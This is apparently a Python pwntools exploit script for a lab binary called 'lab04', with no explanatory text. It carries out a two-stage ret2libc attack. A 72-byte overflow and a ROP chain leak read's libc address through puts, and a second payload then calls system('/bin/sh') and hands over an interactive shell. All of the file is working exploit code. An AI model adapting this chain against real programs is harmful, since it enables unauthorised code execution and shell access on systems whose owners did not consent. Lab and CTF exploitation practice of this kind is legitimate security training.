#!/usr/bin/python3

from pwn import *

elf = ELF("./lab04")
p = process("./lab04")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(elf)


try:
    ret = rop.find_gadget(['ret'])[0]
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    read_got = elf.got['read']
    puts_plt = elf.plt['puts']
    main = elf.symbols['main']
except Exception as e:
    log.error(f"An error occurred while finding the addresses {e}")

payload = b"A" * 72
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(main)

try:
    p.send(payload)
    p.recvuntil("Input:")
    p.recvline()

    out = p.recvline().strip()
    leak_address = u64(out.ljust(8,b'\x00'))
    libc_base = leak_address - libc.symbols['read']

    log.info(f"Leaked Address is: {hex(leak_address)}")
    log.info(f"Libc Based Address is: {hex(libc_base)}")

    system = libc_base + libc.symbols['system']
    binsh = libc_base + next(libc.search(b'/bin/sh'))
    exit_func = libc_base + libc.symbols['exit']

    shell_payload = b"A" * 72
    shell_payload += p64(ret)
    shell_payload += p64(ret)
    shell_payload += p64(pop_rdi)
    shell_payload += p64(binsh)
    shell_payload += p64(system)
    shell_payload += p64(exit_func)

    p.recvuntil("Input:")
    p.send(shell_payload)
    p.interactive()

except Exception as e:
    log.error(f"Error {e}")
    p.close()